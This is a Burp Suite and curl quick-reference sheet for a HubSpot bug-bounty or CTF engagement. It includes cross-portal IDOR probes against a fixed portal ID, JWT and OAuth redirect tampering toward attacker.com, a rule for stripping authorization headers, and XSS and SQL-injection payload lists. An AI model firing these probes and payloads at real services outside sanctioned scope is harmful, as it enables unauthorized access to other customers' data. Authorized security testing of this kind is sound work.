# Command Reference & Quick Tips

## 🚀 Quick Commands

### Burp Suite Keyboard Shortcuts

```
Navigation & Actions:
Ctrl+R        - Send to Repeater
Ctrl+I        - Send to Intruder
Ctrl+C        - Send to Comparer
Ctrl+T        - Send to Target Site Map
Ctrl+Space    - Send to Active Scanner

Proxy Control:
Ctrl+H        - Toggle Intercept On/Off
Ctrl+F        - Forward intercepted request
Ctrl+D        - Drop intercepted request

Editing:
Ctrl+F        - Find in current view
Ctrl+U        - URL encode selection
Ctrl+Shift+U  - URL decode selection
Ctrl+B        - Base64 encode
Ctrl+Shift+B  - Base64 decode

View Control:
Ctrl++        - Increase font size
Ctrl+-        - Decrease font size
Ctrl+0        - Reset font size
```

### API Testing Commands

#### Basic Contact Retrieval
```bash
# Get all contacts from your portal
curl -H "Authorization: Bearer YOUR_API_KEY" \
     https://api.hubapi.com/contacts/v1/lists/all/contacts/all

# Get specific contact by VID
curl -H "Authorization: Bearer YOUR_API_KEY" \
     https://api.hubapi.com/contacts/v1/contact/vid/12345/profile

# Get contact with properties
curl -H "Authorization: Bearer YOUR_API_KEY" \
     "https://api.hubapi.com/contacts/v1/contact/vid/12345/profile?properties=firstname&properties=email"
```

#### CTF Challenge Testing
```bash
# Attempt cross-portal contact access
curl -H "Authorization: Bearer YOUR_API_KEY" \
     "https://api.hubapi.com/contacts/v1/lists/all/contacts/all?portalId=46962361"

# Try CRM v3 API
curl -H "Authorization: Bearer YOUR_API_KEY" \
     "https://api.hubapi.com/crm/v3/objects/contacts?portalId=46962361"

# Search contacts
curl -X POST https://api.hubapi.com/search/v2/contacts \
     -H "Authorization: Bearer YOUR_API_KEY" \
     -H "Content-Type: application/json" \
     -d '{"portalId":"46962361","query":"*"}'
```

#### Parameter Manipulation Tests
```bash
# Test with null portal ID
curl -H "Authorization: Bearer YOUR_API_KEY" \
     "https://api.hubapi.com/contacts/v1/lists/all/contacts/all?portalId=null"

# Test with wildcard
curl -H "Authorization: Bearer YOUR_API_KEY" \
     "https://api.hubapi.com/contacts/v1/lists/all/contacts/all?portalId=*"

# Test without portal ID
curl -H "Authorization: Bearer YOUR_API_KEY" \
     "https://api.hubapi.com/contacts/v1/lists/all/contacts/all"
```

#### Batch Operations
```bash
# Batch read contacts
curl -X POST https://api.hubapi.com/crm/v3/objects/contacts/batch/read \
     -H "Authorization: Bearer YOUR_API_KEY" \
     -H "Content-Type: application/json" \
     -d '{
       "inputs": [
         {"id": "12345"},
         {"id": "12346"}
       ],
       "properties": ["firstname", "lastname", "email", "super_secret"]
     }'
```

### Python Script Usage

#### Portal Enumeration Script
```bash
# Run the enumeration script
python scripts/portal_enumeration.py

# Follow the prompts:
# 1. Enter your API key
# 2. Enter your portal ID
# 3. Select test option (2 for CTF)
```

#### Log Analysis Script
```bash
# Analyze Burp logs
python scripts/analyze_burp_logs.py

# When prompted:
# 1. Enter path to Burp log file
# 2. Script will analyze for patterns
# 3. Generates report with findings
```

## 🎯 Common Testing Patterns

### Testing for IDOR

#### Pattern 1: Direct Object Access
```
1. Capture legitimate request in Burp
2. Send to Repeater (Ctrl+R)
3. Change object ID to test ID
4. Change portal ID if present
5. Send and analyze response
```

#### Pattern 2: Autorize Testing
```
1. Configure Autorize with two user sessions
2. Browse as high-privilege user
3. Autorize auto-replays with low-privilege
4. Check results for authorization bypass
```

#### Pattern 3: Intruder Fuzzing
```
1. Send request to Intruder (Ctrl+I)
2. Mark portal ID or object ID as position (§)
3. Load payload list (portal IDs or object IDs)
4. Attack type: Sniper
5. Start attack and analyze responses
```

### Testing for XSS

#### Pattern 1: Reflected XSS
```
1. Find input reflected in response
2. Test basic payload: <script>alert(1)</script>
3. If filtered, try bypass techniques:
   - <img src=x onerror=alert(1)>
   - <svg onload=alert(1)>
   - "><script>alert(1)</script>
```

#### Pattern 2: Stored XSS
```
1. Inject payload in input field
2. Navigate to pages where input is displayed
3. Check if payload executes
4. Test in different contexts:
   - Profile view
   - List view
   - Search results
   - Reports
```

#### Pattern 3: DOM XSS
```
1. Use DOM Invader extension
2. Browse application
3. Check for DOM sinks:
   - innerHTML
   - eval()
   - location.href
4. Test payloads in URL fragments (#payload)
```

### Testing Authentication

#### Pattern 1: JWT Manipulation
```
1. Capture JWT token
2. Decode at jwt.io
3. Modify payload:
   - Change portal_id
   - Change user_id
   - Change role/permissions
4. Re-encode (if signature check is weak)
5. Test modified token
```

#### Pattern 2: OAuth Testing
```
1. Intercept OAuth flow
2. Test redirect_uri manipulation:
   - https://attacker.com
   - https://app.hubspot.com@attacker.com
   - https://app.hubspot.com.attacker.com
3. Test state parameter bypass
4. Test code reuse
```

#### Pattern 3: Session Testing
```
1. Log in and capture session
2. Test session in Repeater
3. Remove authentication headers
4. Try session from different portal
5. Test session after logout
```

## 📊 Burp Suite Configurations

### Intruder Payload Sets

#### Portal IDs
```
Create list: portal-ids.txt
Content:
YOUR_PORTAL_ID_1
YOUR_PORTAL_ID_2
46962361
null
-1
0
*
999999999
```

#### Common XSS Payloads
```
Create list: xss-payloads.txt
Content:
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'-alert(1)-'
javascript:alert(1)
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
```

#### SQL Injection Payloads
```
Create list: sqli-payloads.txt
Content:
' OR '1'='1
' OR '1'='1'--
' OR 1=1--
" OR "1"="1
') OR ('1'='1
admin' OR '1'='1
```

### Match and Replace Rules

Add these in Proxy → Options → Match and Replace:

#### Auto-test CTF Portal
```
Type: Request body
Match: "portalId":"(\d+)"
Replace: "portalId":"46962361"
Enabled: [Toggle as needed]
```

#### Remove Authentication
```
Type: Request header
Match: ^Authorization:.*$
Replace: [empty]
Enabled: [Toggle as needed]
```

#### Add Debug Parameters
```
Type: Request first line
Match: ^(GET [^?]*)\??(.*) HTTP
Replace: $1?debug=1&verbose=1&$2 HTTP
Enabled: [Toggle as needed]
```

### Logger++ Filters

Add these filters in Logger++ settings:

#### Filter 1: CTF Portal
```
Filter: Request/Response contains "46962361"
Color: Red
```

#### Filter 2: Contact Data
```
Filter: Request/Response contains "firstname" OR "super_secret"
Color: Yellow
```

#### Filter 3: Sensitive Endpoints
```
Filter: URL contains "/contact/" OR "/crm/"
Color: Green
```

## 🔍 Analysis Patterns

### Response Analysis

#### Success Indicators
```
Look for:
- Status 200 with data
- Response length > expected
- Sensitive fields in response
- Different status than expected
```

#### Failure Indicators
```
Look for:
- Status 403 (Forbidden)
- Status 404 (Not Found)
- Status 401 (Unauthorized)
- Error messages
- Empty responses
```

### Log Analysis

#### Portal ID Extraction
```bash
# Extract all portal IDs from Burp log
grep -oP 'portalId["\s:=]+\K\d+' burp-log.txt | sort -u
```

#### Endpoint Extraction
```bash
# Extract all API endpoints
grep -oP 'https://api\.hubapi\.com\K[^\s]*' burp-log.txt | sort -u
```

## 💡 Pro Tips

### Burp Suite Efficiency

1. **Use Keyboard Shortcuts** - Much faster than mouse
2. **Organize Repeater Tabs** - Group by feature/test
3. **Comment Requests** - Right-click → Add Comment
4. **Highlight Important** - Right-click → Highlight
5. **Use Comparer** - Compare responses side-by-side

### Testing Efficiency

1. **Start with High-Value Targets** - CTF, then IDORs
2. **Document as You Go** - Don't rely on memory
3. **Use Autorize for Auth Testing** - Automate where possible
4. **Save Interesting Requests** - Create a collection
5. **Regular Backups** - Save Burp project frequently

### Finding Vulnerabilities

1. **Look for Patterns** - Same vuln often appears multiple places
2. **Test Edge Cases** - null, empty, negative, wildcard values
3. **Check All API Versions** - v1, v2, v3 may behave differently
4. **Think About Impact** - How would you weaponize this?
5. **Chain Vulnerabilities** - Combine low-impact bugs for high impact

## 🎓 Learning Commands

### Check Request/Response Details
```
In Burp Repeater:
- View → Render - See how browser renders
- Inspector → Request/Response - Analyze structure
- Pretty/Raw/Hex - Different view modes
```

### Decode/Encode Values
```
Select text → Right-click → Convert selection →
- URL encode/decode
- HTML encode/decode
- Base64 encode/decode
- ASCII hex
```

### Compare Responses
```
1. Send request to Comparer (Ctrl+C)
2. Send another request to Comparer
3. Comparer → Select both items
4. Click "Words" or "Bytes" comparison
```

## 🚨 Important Reminders

### Before Every Test
```
✓ Is this in scope?
✓ Am I testing my own portal or CTF portal?
✓ Am I following rate limits?
✓ Am I documenting this test?
```

### When You Find Something
```
✓ Screenshot immediately
✓ Save Burp request/response
✓ Test multiple times to verify
✓ Document exact reproduction steps
✓ Assess the real security impact
```

### Before Submitting Report
```
✓ Is it really a vulnerability?
✓ Is it in scope?
✓ Is it a duplicate?
✓ Do I have clear reproduction steps?
✓ Do I have proof of impact?
✓ Have I removed sensitive data from report?
```

---

**Keep this file open while testing for quick reference!**
